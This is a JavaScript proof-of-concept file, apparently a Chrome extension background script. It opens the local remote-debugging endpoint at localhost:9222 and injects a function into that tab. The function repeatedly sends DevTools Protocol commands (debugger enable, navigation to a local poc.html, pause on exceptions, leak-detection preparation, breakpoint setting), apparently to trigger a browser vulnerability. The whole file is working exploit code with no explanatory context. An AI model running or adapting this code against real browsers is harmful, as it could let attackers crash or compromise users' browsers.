function poc() {
  const sleep = time => new Promise(resolve => setTimeout(resolve, time));

  function connect(webSocketDebuggerUrl) {
    return new Promise(function (resolve, reject) {
      var server = new WebSocket(webSocketDebuggerUrl);

      server.onopen = function () {
        resolve(server);
      };

      server.onerror = function (err) {
        reject(err);
      };
    });
  }

  function waitForMessage(ws) {
    return new Promise(resolve => {
      ws.onmessage = message => {
        resolve(message);
      };
    });
  }

  async function run(ws_url) {
    try {
      const ws = await connect(ws_url);
      ws.send('{"id": 0, "method": "Debugger.enable", "params": {"maxScriptsCacheSize": 100}}');
      await waitForMessage(ws);
      await sleep(200);
      ws.send('{"id": 1, "method": "Page.navigate", "params": {"url": "http://localhost:8080/poc.html"}}');
      await waitForMessage(ws);
      await sleep(200);
      ws.send('{"id": 2, "method": "Debugger.setPauseOnExceptions", "params": {"state": "uncaught"}}');
      await waitForMessage(ws);
      await sleep(200);
      ws.send('{"id": 3, "method": "Memory.prepareForLeakDetection", "params": {}}');
      await waitForMessage(ws);
      await sleep(200);
      ws.send('{"id": 4, "method": "Debugger.setBreakpointByUrl", "params": {"lineNumber": 1, "urlRegex": "http://localhost:8080/poc.html"}}');
      await waitForMessage(ws);
      ws.close();
    } catch {}
  }

  for (const dbg of JSON.parse(document.querySelector("body > pre").innerText)) {
    if (dbg["url"] == "about:blank") {
      ws_url = dbg["webSocketDebuggerUrl"];
    }
  }

  setInterval(() => {
    run(ws_url);
  }, 500);
}

chrome.tabs.onUpdated.addListener(function (tabId, info, tab) {
  if (info.status == "complete" && tab.url.indexOf("http://localhost:9222") == 0) {
    chrome.scripting.executeScript({
      target: {
        tabId: tabId
      },
      func: poc
    });
  }
});
chrome.tabs.create({
  url: "about:blank"
}, () => {
  chrome.tabs.create({
    url: "http://localhost:9222/json",
    active: false
  }, null);
});